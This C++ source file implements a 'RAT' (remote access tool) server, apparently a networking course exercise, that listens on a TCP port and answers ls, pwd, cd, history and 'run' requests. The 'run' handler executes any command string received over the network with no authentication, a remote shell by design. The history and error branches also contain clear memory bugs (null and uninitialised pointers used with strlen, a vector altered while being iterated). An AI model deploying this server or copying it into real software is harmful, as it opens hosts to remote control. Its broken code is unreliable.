//
//
//

#include <iostream>
#include <sys/socket.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <netdb.h>
#include <sys/select.h>
#include <vector>
#include <array>
#include <fcntl.h>
#include "util.h"
#include "RAT.h"

// Structure to maintain state about multiple TCP clients that are connected to our server
// This is required because each client has a different socket, and needs to be handled
// separately.
struct TCPClient {
    int sock_fd;
    char recv_buf[DEFAULT_BUF_SIZE];
    char send_buf[DEFAULT_BUF_SIZE];
    int bytes_to_send;
    int bytes_to_read;
    struct sockaddr client_address;
    socklen_t client_address_len;
    int total_bytes_from_client;
    std::vector<std::string> history;
};

//RATResponse send_ls_response(int tcp_socket, char *data_string) {
//    int random_number;
//    int offset = 0;
//    struct RATResponse ls_response;
//    ls_response.hdr.type = htons(RAT_REPLY);
//    ls_response.hdr.total_msg_size = htons(sizeof(struct RATResponse) + strlen(data_string));
//    ls_response.response_type = htons(RESPONSE_OK);
//    ls_response.request_id = htonl(random_number);
//    ls_response.data_length = htons(strlen(data_string));
//
//
//    memcpy(&tcp_clients[i]->send_buf[offset], &ls_response, sizeof(struct RATResponse));
//    offset += sizeof(struct RATResponse);
//    memcpy(&tcp_clients[i]->send_buf[offset], data_string, strlen(data_string));
//    offset += strlen(data_string);
//
//    response = send(tcp_socket, tcp_clients[i]->send_buf, offset, 0);
//    offset = 0;
//    return response;
//}

/**
 *
 * TCP server example. Reads in IP PORT
 * from the command line, and accepts connections via TCP
 * on IP:PORT.
 *
 * e.g., ./tcpserver 127.0.0.1 8888
 *
 * @param argc count of arguments on the command line
 * @param argv array of command line arguments
 * @return 0 on success, non-zero if an error occurred
 */


int main(int argc, char *argv[]) {
    // Alias for argv[1] for convenience
    char *ip_string;
    // Alias for argv[2] for convenience
    char *port_string;

    // Port to send TCP data to. Need to convert from command line string to a number
    unsigned int port;
    // The socket used to send data
    int tcp_socket;
    // Variable used to check return codes from various functions
    int ret;

    int client_socket;

    struct sockaddr_in client_address;
    socklen_t client_address_len;

    struct addrinfo hints;
    struct addrinfo *results;
    struct addrinfo *results_it;
    struct RATRequest *client_request;
    // Select variables
    // Maximum file descriptor of those we need to select on
    int max_fds;
    // set of fds ready to read
    fd_set read_set;
    // set of fds ready to write
    fd_set write_set;
    // set of fds with exceptions
    fd_set except_set;
    // Timeout value for select
    struct timeval tv;

    // Timeout after two seconds
    tv.tv_sec = 2;
    tv.tv_usec = 0;

    std::vector<TCPClient *> tcp_clients;

    // Note: this needs to be 3, because the program name counts as an argument!
    if (argc < 3) {
        std::cerr << "Please specify HOSTNAME PORT as first two arguments." << std::endl;
        return 1;
    }
    // Set up variables "aliases"
    ip_string = argv[1];
    port_string = argv[2];

    // Create the TCP socket.
    // AF_INET is the address family used for IPv4 addresses
    // SOCK_STREAM indicates creation of a TCP socket
    tcp_socket = socket(AF_INET, SOCK_STREAM, 0);

    // Make sure socket was created successfully, or exit.
    if (tcp_socket == -1) {
        std::cerr << "Failed to create tcp socket!" << std::endl;
        std::cerr << strerror(errno) << std::endl;
        return 1;
    }

    // Set the socket to be non blocking
    ret = fcntl(tcp_socket, F_SETFL, O_NONBLOCK);
    if (ret == -1) {
        perror("can’t set O_NONBLOCK using fcntl()");
        exit(EXIT_FAILURE);
    }

    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_addr = NULL;
    hints.ai_canonname = NULL;
    hints.ai_family = AF_INET;
    hints.ai_protocol = 0;
    hints.ai_flags = AI_PASSIVE;
    hints.ai_socktype = SOCK_STREAM;
    // Instead of using inet_pton, use getaddrinfo to convert.
    ret = getaddrinfo(ip_string, port_string, &hints, &results);

    if (ret != 0) {
        std::cerr << "Getaddrinfo failed with error " << ret << std::endl;
        perror("getaddrinfo");
        return 1;
    }

    // Check we have at least one result
    results_it = results;

    ret = -1;
    while (results_it != NULL) {
        std::cout << "Trying to connect to something?" << std::endl;
        ret = bind(tcp_socket, results_it->ai_addr, results_it->ai_addrlen);
        //ret = connect(tcp_socket, results_it->ai_addr, results_it->ai_addrlen);
        if (ret == 0) {
            break;
        }
        perror("bind");
        results_it = results_it->ai_next;
    }

    // Whatever happened, we need to free the address list.
    freeaddrinfo(results);

    // Check if connecting succeeded at all
    if (ret != 0) {
        std::cout << "Failed to bind to any addresses!" << std::endl;
        return 1;
    }

    // Listen on the tcp socket
    ret = listen(tcp_socket, 50);

    // Check if connecting succeeded at all
    if (ret != 0) {
        std::cout << "Failed to listen!" << std::endl;
        close(tcp_socket);
        perror("listen");
        return 1;
    }

    while (true) {
        FD_ZERO(&read_set);
        FD_ZERO(&write_set);
        FD_ZERO(&except_set);

        FD_SET(tcp_socket, &read_set);
        max_fds = tcp_socket + 1;

        // Set each file descriptor in our vector to check if it's ready to read/write.
        for (int i = 0; i < tcp_clients.size(); i++) {
            if (tcp_clients[i] == NULL)
                continue;

            if (tcp_clients[i]->sock_fd > max_fds) {
                max_fds = tcp_clients[i]->sock_fd;
            }
            //std::cout << "Checking fd " << tcp_clients[i]->sock_fd << " for readiness!" << std::endl;
            FD_SET(tcp_clients[i]->sock_fd, &read_set);
            FD_SET(tcp_clients[i]->sock_fd, &write_set);
            FD_SET(tcp_clients[i]->sock_fd, &except_set);
        }

        if ((ret = select(max_fds + 1, &read_set, &write_set, &except_set, &tv)) == -1) {
            perror("select");
            break;
        }

        // Nothing ready to receive on select!
        if (ret == 0) {
            //std::cout << "No file descriptors ready in select!" << std::endl;
            continue;
        }

        //std::cout << ret << " file descriptors ready to do something!" << std::endl;
        if (FD_ISSET(tcp_socket, &read_set)) {
            //std::cout << "Ready to accept on tcp_socket!" << std::endl;
            struct TCPClient *new_tcp_client = (struct TCPClient *) malloc(sizeof(struct TCPClient));
            memset(new_tcp_client, 0, sizeof(struct TCPClient));
            client_address_len = sizeof(struct sockaddr_in);
            new_tcp_client->sock_fd = accept(tcp_socket, (struct sockaddr *) &client_address, &client_address_len);
            if (new_tcp_client->sock_fd == -1) {
                perror("accept");
                free(new_tcp_client);
            } else {
                memcpy(&new_tcp_client->client_address, &client_address, client_address_len);
                tcp_clients.push_back(new_tcp_client);
                std::cout << "Accepted connection from : "
                          << get_network_address(&new_tcp_client->client_address, new_tcp_client->bytes_to_read) << "\n";
            }
        }

        for (int i = 0; i < tcp_clients.size(); i++) {
            if (tcp_clients[i] == NULL)
                continue;

            if (FD_ISSET(tcp_clients[i]->sock_fd, &read_set)) {
                std::cout << "Ready to read from socket fd " << tcp_clients[i]->sock_fd << std::endl;
                ret = recv(tcp_clients[i]->sock_fd, tcp_clients[i]->recv_buf, DEFAULT_BUF_SIZE, 0);
                if (ret == -1) {
                    perror("recv");
                } else if (ret == 0) { // Socket shutdown
                    close(tcp_clients[i]->sock_fd);
                    free(tcp_clients[i]);
                    tcp_clients[i] = NULL;
                    continue;
                } else {
                    std::cout << "Read " << ret << " bytes from client at address "
                              << get_network_address(&tcp_clients[i]->client_address, tcp_clients[i]->client_address_len)
                              << std::endl;


                    tcp_clients[i]->recv_buf[ret] = '\0';
                    int bytes_processed = 0;
                    // Convenience variable for making code easier to read
                    int bytes_left = ret - bytes_processed;

                    if (bytes_left >= sizeof(struct RATRequest)) {

                        client_request = (struct RATRequest *)&tcp_clients[i]->recv_buf[bytes_processed];
                        // Convert numerical data from network to host byte order
                        client_request->req_type = ntohs(client_request->req_type);
                        client_request->hdr.total_msg_size = ntohs(client_request->hdr.total_msg_size);
                        client_request->argument_length = ntohs(client_request->argument_length);
                        client_request->request_id = ntohl(client_request->request_id);
                        std::cout << "Received RAT message type " << client_request->req_type << " Length "
                                  << client_request->hdr.total_msg_size << std::endl;

                        //if (bytes_left >= client_request->hdr.total_msg_size) {
                            if(client_request->req_type == 4020){
                                tcp_clients[i]->history.push_back("ls");
                                const char *cmd = "ls -lah";
                                const char *result;
                                int bytes_sent;
                                //result from ls command
                                execute_command_get_response(cmd, &result);
                                //RATResponse formatting & adding ls result
                                int offset = 0;
                                struct RATResponse ls_response;
                                ls_response.hdr.type = htons(RAT_REPLY);
                                ls_response.hdr.total_msg_size = htons(sizeof(struct RATResponse) + strlen(result));
                                ls_response.response_type = htons(RESPONSE_OK);
                                ls_response.request_id = htonl(client_request->request_id);
                                ls_response.data_length = htons(strlen(result));
                                std::cout << client_request->request_id << "\n";
                                //memcopy RATResponse and ls cmd result into send buffer
                                memcpy(&tcp_clients[i]->send_buf[offset], &ls_response, sizeof(struct RATResponse));
                                offset += sizeof(struct RATResponse);
                                memcpy(&tcp_clients[i]->send_buf[offset], result, strlen(result));
                                offset += strlen(result);

                                tcp_clients[i]->bytes_to_send = offset;

                                offset = 0;
                            }else if(client_request->req_type == 4021){
                                tcp_clients[i]->history.push_back("pwd");
                                const char *cmd = "pwd";
                                const char *result;

                                execute_command_get_response(cmd, &result);

                                int bytes_sent;
                                //RATResponse formatting & adding pwd result
                                int offset = 0;
                                struct RATResponse pwd_response;
                                pwd_response.hdr.type = htons(RAT_REPLY);
                                pwd_response.hdr.total_msg_size = htons(sizeof(struct RATResponse) + strlen(result));
                                pwd_response.response_type = htons(RESPONSE_OK);
                                pwd_response.request_id = htonl(client_request->request_id);
                                pwd_response.data_length = htons(strlen(result));
                                std::cout << client_request->request_id << "\n";
                                //memcopy RATResponse and ls cmd result into send buffer
                                memcpy(&tcp_clients[i]->send_buf[offset], &pwd_response, sizeof(struct RATResponse));
                                offset += sizeof(struct RATResponse);
                                memcpy(&tcp_clients[i]->send_buf[offset], result, strlen(result));
                                offset += strlen(result);

                                tcp_clients[i]->bytes_to_send = offset;

                                offset = 0;
                            }else if(client_request->req_type == 4022){
                                //char *argument = &tcp_clients[i]->recv_buf[sizeof(RATRequest)];
                                //int cd = chdir(&tcp_clients[i]->recv_buf[sizeof(RATRequest)]);
//
                                char *the_dir = (char*)malloc(client_request->argument_length + 1);
                                memcpy(the_dir, &tcp_clients[i]->recv_buf[sizeof(RATRequest)], client_request->argument_length);
                                the_dir[client_request->argument_length] = '\0';
                                const char *result;



                                if(chdir(the_dir) == 0){
                                    result = "Successfully Changed Directory";
                                }else{
                                    result =  "Unsuccessful";
                                }
                                //RATResponse formatting & adding cd result
                                int offset = 0;
                                struct RATResponse cd_response;
                                cd_response.hdr.type = htons(RAT_REPLY);
                                cd_response.hdr.total_msg_size = htons(sizeof(struct RATResponse) + strlen(result));
                                cd_response.response_type = htons(RESPONSE_OK);
                                cd_response.request_id = htonl(client_request->request_id);
                                cd_response.data_length = htons(strlen(result));
                                std::cout << client_request->request_id << "\n";
                                //memcopy RATResponse and ls cmd result into send buffer
                                memcpy(&tcp_clients[i]->send_buf[offset], &cd_response, sizeof(struct RATResponse));
                                offset += sizeof(struct RATResponse);
                                memcpy(&tcp_clients[i]->send_buf[offset], result, strlen(result));
                                offset += strlen(result);

                                tcp_clients[i]->bytes_to_send = offset;

                                offset = 0;
                            }else if(client_request->req_type == 4023){
                                tcp_clients[i]->history.push_back("run");
                                const char *cmd =  &tcp_clients[i]->recv_buf[sizeof(RATRequest)];

                                const char *result;
                                execute_command_get_response(cmd, &result);
                                //RATResponse formatting & adding run result
                                int offset = 0;
                                struct RATResponse run_response;
                                run_response.hdr.type = htons(RAT_REPLY);
                                run_response.hdr.total_msg_size = htons(sizeof(struct RATResponse) + strlen(result));
                                run_response.response_type = htons(RESPONSE_OK);
                                run_response.request_id = htonl(client_request->request_id);
                                run_response.data_length = htons(strlen(result));
                                //memcopy RATResponse and ls cmd result into send buffer
                                memcpy(&tcp_clients[i]->send_buf[offset], &run_response, sizeof(struct RATResponse));
                                offset += sizeof(struct RATResponse);
                                memcpy(&tcp_clients[i]->send_buf[offset], result, strlen(result));
                                offset += strlen(result);
                                tcp_clients[i]->bytes_to_send = offset;

                                offset = 0;
                            }else if(client_request->req_type == 4024){
                                tcp_clients[i]->history.push_back("history");
                                char *total_length = 0;
                                for(auto a : tcp_clients[i]->history){
                                    tcp_clients[i]->history.pop_back();
                                    std::cerr << a << "\n";
                                    int str_len = a.size();
                                    total_length += str_len;
                                    std::cerr << total_length << "\n";

                                }
                                char *history_stuff = (char *)malloc(strlen(total_length));
                                int history_offset = 0;
                                for (auto a : tcp_clients[i]->history) {
                                    memcpy(history_stuff, a.c_str(), a.size());
                                    history_offset += strlen(total_length);
                                }
                                int offset = 0;
                                struct RATResponse history_response;
                                history_response.hdr.type = htons(RAT_REPLY);
                                history_response.hdr.total_msg_size = htons(sizeof(struct RATResponse) + strlen(total_length));
                                history_response.response_type = htons(RESPONSE_OK);
                                history_response.request_id = htonl(client_request->request_id);
                                history_response.data_length = htons(strlen(total_length));
                                //memcopy RATResponse and ls cmd result into send buffer
                                memcpy(&tcp_clients[i]->send_buf[offset], &history_response, sizeof(struct RATResponse));
                                offset += sizeof(struct RATResponse);
                                memcpy(&tcp_clients[i]->send_buf[offset], history_stuff, strlen(history_stuff));
                                offset += strlen(history_stuff);
                                tcp_clients[i]->bytes_to_send = offset;

                                offset = 0;
                            }else{
                                int offset = 0;
                                const char *send;
                                struct RATResponse error_response;
                                error_response.hdr.type = htons(RAT_REPLY);
                                error_response.hdr.total_msg_size = htons(sizeof(struct RATResponse));
                                error_response.response_type = htons(RESPONSE_ERROR);
                                error_response.request_id = htonl(client_request->request_id);
                                error_response.data_length = htons(strlen(send));
                                std::cout << client_request->request_id << "\n";
                                //memcopy RATResponse and ls cmd result into send buffer
                                memcpy(&tcp_clients[i]->send_buf[offset], &error_response, sizeof(struct RATResponse));
                                offset += sizeof(struct RATResponse);

                                tcp_clients[i]->bytes_to_send = offset;

                                offset = 0;
                            }
                            bytes_processed += client_request->hdr.total_msg_size;

                        //} else
                            //bytes_processed += sizeof(struct RATRequest);
                    } else {
                        std::cout << "Have " << bytes_left << " bytes, but too small to be a correctly formatted message. Ignoring!" << std::endl;
                        // This ensures we don't have an infinite loop when receiving (potentially) too small messages.
                        bytes_processed += bytes_left;
                    }
                }

            }

            if (tcp_clients[i] == NULL)
                continue;

            if (FD_ISSET(tcp_clients[i]->sock_fd, &write_set)) {
                //std::cout << "Ready to write to socket fd " << tcp_clients[i]->sock_fd << std::endl;
                if (tcp_clients[i]->bytes_to_send > 0) {
                    ret = send(tcp_clients[i]->sock_fd, tcp_clients[i]->send_buf, tcp_clients[i]->bytes_to_send, 0);
                    //send response in RATResponse format and convert to htons
                    std::cout << "Wrote " << ret << " bytes on fd " << tcp_clients[i]->sock_fd << std::endl;
                    if (ret == tcp_clients[i]->bytes_to_send) {
                        tcp_clients[i]->bytes_to_send = 0;
                    }
                }
            }

            if (FD_ISSET(tcp_clients[i]->sock_fd, &except_set)) {
                std::cout << "Got an exception on socket fd " << tcp_clients[i]->sock_fd << std::endl;
            }
        }
    }


    close(client_socket);
    close(tcp_socket);
    return 0;
}



